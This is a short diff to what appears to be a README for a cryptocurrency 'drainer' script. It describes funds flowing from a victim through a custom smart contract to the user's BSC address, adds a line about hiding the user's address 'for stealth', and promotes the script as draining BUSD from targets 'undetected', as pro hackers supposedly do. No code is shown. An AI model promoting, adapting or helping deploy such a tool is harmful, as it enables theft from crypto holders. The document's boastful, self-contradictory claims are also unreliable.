@@ -3,6 +3,8 @@ HOW IT WORKS
 
 VICTIM ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
+The !!! smart contract address !!! appears in the transaction not yours this is for stealth
+
 This script will let you drain BUSD from the targets address
 
 This is a free community code that anyone can audit or edit with pull request and works as designed its been used by pro hackers for years to steal crypto undetected i didnt write this script im just sharing it to show how hackers steal crypto
